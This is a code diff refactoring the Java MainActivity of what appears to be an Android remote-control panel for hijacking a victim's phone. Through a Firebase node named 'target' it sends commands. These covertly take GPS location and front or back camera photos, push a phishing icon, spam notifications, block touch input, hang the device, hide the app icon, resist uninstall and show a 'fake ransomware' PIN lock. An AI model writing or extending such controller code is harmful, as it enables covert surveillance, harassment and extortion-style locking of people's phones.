@@ -34,18 +34,16 @@ public class MainActivity extends AppCompatActivity {
     // Header
     private TextView tvDeviceName, tvDeviceId, tvStatus, tvBattery;
     private TextView tvDeviceName2, tvDeviceId2;
-
-    // Anti Uninstall
     private TextView tvAntiUninstallText;
     private Switch swAntiUninstall;
 
-    // Dynamic card components
+    // Card components
     private Switch swFlashlight, swLockLow, swLockCustom, swHideIcon, swNgehang;
     private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus, tvNgehangStatus;
+    private TextView tvNamaFlashlight, tvNamaLockLow, tvNamaLockCustom, tvNamaHideIcon, tvNamaNgehang;
+    private ImageView ivFlashlight, ivLockLow, ivLockCustom, ivHideIcon, ivNgehang;
 
-    // Buttons
-    private Button btnGanti, btnTemaPhising, btnVideoOverlay, btnSpamNotif, btnStuckLayar;
-    private Button btnGPS, btnKamera, btnRansomware, btnSetServer;
+    private Button btnGanti, btnSetServer;
     private EditText etServerUrl;
 
     private static final int REQUEST_VIDEO = 1001;
@@ -58,6 +56,14 @@ public class MainActivity extends AppCompatActivity {
     private ValueEventListener hideIconListener;
     private ValueEventListener ngehangListener;
 
+    // Card IDs
+    private int[] cardIds = {
+        R.id.cardFlashlight, R.id.cardLockLow, R.id.cardLockCustom,
+        R.id.cardTemaPhising, R.id.cardHideIcon, R.id.cardVideoOverlay,
+        R.id.cardSpamNotif, R.id.cardStuckLayar, R.id.cardGPS,
+        R.id.cardKamera, R.id.cardRansomware, R.id.cardNgehang
+    };
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -67,7 +73,7 @@ public class MainActivity extends AppCompatActivity {
         mDatabase = database.getReference("target");
         mStorage = FirebaseStorage.getInstance().getReference();
 
-        // ===== INISIALISASI VIEW DARI LAYOUT BARU =====
+        // ===== INISIALISASI VIEW =====
         // Header
         tvDeviceName = findViewById(R.id.tvDeviceName);
         tvDeviceId = findViewById(R.id.tvDeviceId);
@@ -80,29 +86,59 @@ public class MainActivity extends AppCompatActivity {
         tvAntiUninstallText = findViewById(R.id.tvAntiUninstallText);
         swAntiUninstall = findViewById(R.id.swAntiUninstall);
 
-        // Card components (diakses via include)
-        tvFlashlightStatus = findViewById(R.id.tvStatusFitur);
-        swFlashlight = findViewById(R.id.swFitur);
-        // Karena semua card pake include, ID nya sama, kita atur dinamis di fungsi setupCard()
-
         // Buttons
         btnGanti = findViewById(R.id.btnGanti);
-        btnTemaPhising = findViewById(R.id.btnTemaPhising);
-        btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
-        btnSpamNotif = findViewById(R.id.btnSpamNotif);
-        btnStuckLayar = findViewById(R.id.btnStuckLayar);
-        btnGPS = findViewById(R.id.btnGPS);
-        btnKamera = findViewById(R.id.btnKamera);
-        btnRansomware = findViewById(R.id.btnRansomware);
         btnSetServer = findViewById(R.id.btnSetServer);
         etServerUrl = findViewById(R.id.etServerUrl);
+
+        // ===== SETUP CARD =====
+        setupCard(R.id.cardFlashlight, "Flashlight", R.drawable.ic_flashlight);
+        setupCard(R.id.cardLockLow, "Lock Low", R.drawable.ic_flashlight);
+        setupCard(R.id.cardLockCustom, "Lock Custom V2", R.drawable.ic_flashlight);
+        setupCard(R.id.cardTemaPhising, "Tema Phising", R.drawable.ic_flashlight);
+        setupCard(R.id.cardHideIcon, "Hide Icon", R.drawable.ic_flashlight);
+        setupCard(R.id.cardVideoOverlay, "Video Overlay", R.drawable.ic_flashlight);
+        setupCard(R.id.cardSpamNotif, "Spam Notifikasi", R.drawable.ic_flashlight);
+        setupCard(R.id.cardStuckLayar, "Stuck Layar", R.drawable.ic_flashlight);
+        setupCard(R.id.cardGPS, "GPS", R.drawable.ic_flashlight);
+        setupCard(R.id.cardKamera, "Kamera", R.drawable.ic_flashlight);
+        setupCard(R.id.cardRansomware, "Fake Ransomware", R.drawable.ic_flashlight);
+        setupCard(R.id.cardNgehang, "Ngehang", R.drawable.ic_flashlight);
+
+        // ===== AMBIL REFERENSI SWITCH & TEXTVIEW =====
+        // Flashlight
+        View cardFlashlight = findViewById(R.id.cardFlashlight);
+        swFlashlight = cardFlashlight.findViewById(R.id.swFitur);
+        tvFlashlightStatus = cardFlashlight.findViewById(R.id.tvStatusFitur);
+        tvNamaFlashlight = cardFlashlight.findViewById(R.id.tvNamaFitur);
+
+        // Lock Low
+        View cardLockLow = findViewById(R.id.cardLockLow);
+        swLockLow = cardLockLow.findViewById(R.id.swFitur);
+        tvLockLowStatus = cardLockLow.findViewById(R.id.tvStatusFitur);
+        tvNamaLockLow = cardLockLow.findViewById(R.id.tvNamaFitur);
+
+        // Lock Custom
+        View cardLockCustom = findViewById(R.id.cardLockCustom);
+        swLockCustom = cardLockCustom.findViewById(R.id.swFitur);
+        tvLockCustomStatus = cardLockCustom.findViewById(R.id.tvStatusFitur);
+        tvNamaLockCustom = cardLockCustom.findViewById(R.id.tvNamaFitur);
+
+        // Hide Icon
+        View cardHideIcon = findViewById(R.id.cardHideIcon);
+        swHideIcon = cardHideIcon.findViewById(R.id.swFitur);
+        tvHideIconStatus = cardHideIcon.findViewById(R.id.tvStatusFitur);
+        tvNamaHideIcon = cardHideIcon.findViewById(R.id.tvNamaFitur);
+
+        // Ngehang
+        View cardNgehang = findViewById(R.id.cardNgehang);
+        swNgehang = cardNgehang.findViewById(R.id.swFitur);
+        tvNgehangStatus = cardNgehang.findViewById(R.id.tvStatusFitur);
+        tvNamaNgehang = cardNgehang.findViewById(R.id.tvNamaFitur);
 
         sendMyDeviceInfo();
         listenDeviceInfoRealtime();
         listenStatusRealtime();
-
-        // ===== SETUP CARD FITUR =====
-        setupCards();
 
         // ===== GANTI SERVER =====
         btnSetServer.setOnClickListener(v -> {
@@ -158,24 +194,6 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // ===== TEMA PHISING =====
-        btnTemaPhising.setOnClickListener(v -> {
-            AlertDialog.Builder builder = new AlertDialog.Builder(this);
-            builder.setTitle("🎨 Tema Phising");
-            final EditText input = new EditText(this);
-            input.setHint("Masukkan URL icon baru...");
-            builder.setView(input);
-            builder.setPositiveButton("GANTI", (dialog, which) -> {
-                String url = input.getText().toString();
-                if (!url.isEmpty()) {
-                    mDatabase.child("temaPhising").setValue(url);
-                    Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
-                }
-            });
-            builder.setNegativeButton("Batal", null);
-            builder.show();
-        });
-
         // ===== HIDE ICON =====
         swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
             mDatabase.child("hideIcon").setValue(isChecked);
@@ -183,80 +201,152 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // ===== VIDEO OVERLAY =====
-        btnVideoOverlay.setOnClickListener(v -> {
-            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
-            intent.setType("video/*");
-            startActivityForResult(intent, REQUEST_VIDEO);
-        });
-
-        // ===== SPAM NOTIFIKASI =====
-        btnSpamNotif.setOnClickListener(v -> {
-            AlertDialog.Builder builder = new AlertDialog.Builder(this);
-            builder.setTitle("📨 Kirim Spam Notifikasi");
-            final EditText input = new EditText(this);
-            input.setHint("Ketik pesan spam...");
-            builder.setView(input);
-            builder.setPositiveButton("KIRIM", (dialog, which) -> {
-                String pesan = input.getText().toString();
-                if (!pesan.isEmpty()) {
-                    mDatabase.child("spamNotif").setValue(pesan);
-                    Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
-                } else {
-                    Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
-                }
+        // ===== TEMA PHISING (Button di dalam card) =====
+        View cardTemaPhising = findViewById(R.id.cardTemaPhising);
+        Button btnTemaPhising = cardTemaPhising.findViewById(R.id.btnTemaPhising);
+        if (btnTemaPhising != null) {
+            btnTemaPhising.setOnClickListener(v -> {
+                AlertDialog.Builder builder = new AlertDialog.Builder(this);
+                builder.setTitle("🎨 Tema Phising");
+                final EditText input = new EditText(this);
+                input.setHint("Masukkan URL icon baru...");
+                builder.setView(input);
+                builder.setPositiveButton("GANTI", (dialog, which) -> {
+                    String url = input.getText().toString();
+                    if (!url.isEmpty()) {
+                        mDatabase.child("temaPhising").setValue(url);
+                        Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
+                    }
+                });
+                builder.setNegativeButton("Batal", null);
+                builder.show();
             });
-            builder.setNegativeButton("Batal", null);
-            builder.show();
-        });
+        }
 
-        // ===== STUCK LAYAR =====
-        btnStuckLayar.setOnClickListener(v -> {
-            mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
-            Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
-        });
-
-        // ===== GPS =====
-        btnGPS.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("gps");
-            Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
-        });
-
-        // ===== KAMERA =====
-        btnKamera.setOnClickListener(v -> {
-            AlertDialog.Builder builder = new AlertDialog.Builder(this);
-            builder.setTitle("📸 Pilih Kamera Target");
-            builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
-                String command = (which == 0) ? "camera_front" : "camera_back";
-                mDatabase.child("command").setValue(command);
-                Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
+        // ===== VIDEO OVERLAY (Button di dalam card) =====
+        View cardVideoOverlay = findViewById(R.id.cardVideoOverlay);
+        Button btnVideoOverlay = cardVideoOverlay.findViewById(R.id.btnVideoOverlay);
+        if (btnVideoOverlay != null) {
+            btnVideoOverlay.setOnClickListener(v -> {
+                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
+                intent.setType("video/*");
+                startActivityForResult(intent, REQUEST_VIDEO);
             });
-            builder.show();
-        });
+        }
 
-        // ===== FAKE RANSOMWARE =====
-        btnRansomware.setOnClickListener(v -> {
-            showPinDialog("ransomware", "💰 Fake Ransomware");
-        });
+        // ===== SPAM NOTIFIKASI (Button di dalam card) =====
+        View cardSpamNotif = findViewById(R.id.cardSpamNotif);
+        Button btnSpamNotif = cardSpamNotif.findViewById(R.id.btnSpamNotif);
+        if (btnSpamNotif != null) {
+            btnSpamNotif.setOnClickListener(v -> {
+                AlertDialog.Builder builder = new AlertDialog.Builder(this);
+                builder.setTitle("📨 Kirim Spam Notifikasi");
+                final EditText input = new EditText(this);
+                input.setHint("Ketik pesan spam...");
+                builder.setView(input);
+                builder.setPositiveButton("KIRIM", (dialog, which) -> {
+                    String pesan = input.getText().toString();
+                    if (!pesan.isEmpty()) {
+                        mDatabase.child("spamNotif").setValue(pesan);
+                        Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
+                    } else {
+                        Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
+                    }
+                });
+                builder.setNegativeButton("Batal", null);
+                builder.show();
+            });
+        }
+
+        // ===== STUCK LAYAR (Button di dalam card) =====
+        View cardStuckLayar = findViewById(R.id.cardStuckLayar);
+        Button btnStuckLayar = cardStuckLayar.findViewById(R.id.btnStuckLayar);
+        if (btnStuckLayar != null) {
+            btnStuckLayar.setOnClickListener(v -> {
+                mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
+                Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
+            });
+        }
+
+        // ===== GPS (Button di dalam card) =====
+        View cardGPS = findViewById(R.id.cardGPS);
+        Button btnGPS = cardGPS.findViewById(R.id.btnGPS);
+        if (btnGPS != null) {
+            btnGPS.setOnClickListener(v -> {
+                mDatabase.child("command").setValue("gps");
+                Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
+            });
+        }
+
+        // ===== KAMERA (Button di dalam card) =====
+        View cardKamera = findViewById(R.id.cardKamera);
+        Button btnKamera = cardKamera.findViewById(R.id.btnKamera);
+        if (btnKamera != null) {
+            btnKamera.setOnClickListener(v -> {
+                AlertDialog.Builder builder = new AlertDialog.Builder(this);
+                builder.setTitle("📸 Pilih Kamera Target");
+                builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
+                    String command = (which == 0) ? "camera_front" : "camera_back";
+                    mDatabase.child("command").setValue(command);
+                    Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
+                });
+                builder.show();
+            });
+        }
+
+        // ===== FAKE RANSOMWARE (Button di dalam card) =====
+        View cardRansomware = findViewById(R.id.cardRansomware);
+        Button btnRansomware = cardRansomware.findViewById(R.id.btnRansomware);
+        if (btnRansomware != null) {
+            btnRansomware.setOnClickListener(v -> {
+                showPinDialog("ransomware", "💰 Fake Ransomware");
+            });
+        }
     }
 
     // ===== FUNGSI SETUP CARD =====
-    private void setupCards() {
-        // Flashlight
-        swFlashlight = findViewById(R.id.swFitur);
-        tvFlashlightStatus = findViewById(R.id.tvStatusFitur);
-        // Lock Low
-        swLockLow = findViewById(R.id.swFitur);
-        tvLockLowStatus = findViewById(R.id.tvStatusFitur);
-        // Lock Custom
-        swLockCustom = findViewById(R.id.swFitur);
-        tvLockCustomStatus = findViewById(R.id.tvStatusFitur);
-        // Hide Icon
-        swHideIcon = findViewById(R.id.swFitur);
-        tvHideIconStatus = findViewById(R.id.tvStatusFitur);
-        // Ngehang
-        swNgehang = findViewById(R.id.swFitur);
-        tvNgehangStatus = findViewById(R.id.tvStatusFitur);
+    private void setupCard(int cardId, String nama, int iconRes) {
+        View card = findViewById(cardId);
+        if (card == null) return;
+
+        ImageView ivIcon = card.findViewById(R.id.ivIcon);
+        TextView tvNama = card.findViewById(R.id.tvNamaFitur);
+        Switch swFitur = card.findViewById(R.id.swFitur);
+        TextView tvStatus = card.findViewById(R.id.tvStatusFitur);
+
+        if (ivIcon != null) ivIcon.setImageResource(iconRes);
+        if (tvNama != null) tvNama.setText(nama);
+
+        // Kalo fitur pake button (bukan toggle) — sembunyiin toggle
+        if (nama.equals("Tema Phising") || nama.equals("Video Overlay") ||
+            nama.equals("Spam Notifikasi") || nama.equals("Stuck Layar") ||
+            nama.equals("GPS") || nama.equals("Kamera") || nama.equals("Fake Ransomware")) {
+            if (swFitur != null) swFitur.setVisibility(View.GONE);
+            if (tvStatus != null) tvStatus.setVisibility(View.GONE);
+            // Tampilin button
+            Button btn = card.findViewById(R.id.btnFitur);
+            if (btn == null) {
+                btn = new Button(this);
+                btn.setId(R.id.btnFitur);
+                btn.setText("TAP");
+                btn.setTextColor(getColor(R.color.white));
+                btn.setBackgroundResource(R.drawable.primary_btn_bg);
+                // Tambahkan ke layout
+                LinearLayout parent = (LinearLayout) card;
+                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                );
+                params.setMargins(0, 8, 0, 0);
+                btn.setLayoutParams(params);
+                parent.addView(btn);
+            }
+            btn.setVisibility(View.VISIBLE);
+        } else {
+            // Fitur pake toggle
+            if (swFitur != null) swFitur.setVisibility(View.VISIBLE);
+            if (tvStatus != null) tvStatus.setVisibility(View.VISIBLE);
+        }
     }
 
     // ===== DIALOG PIN =====
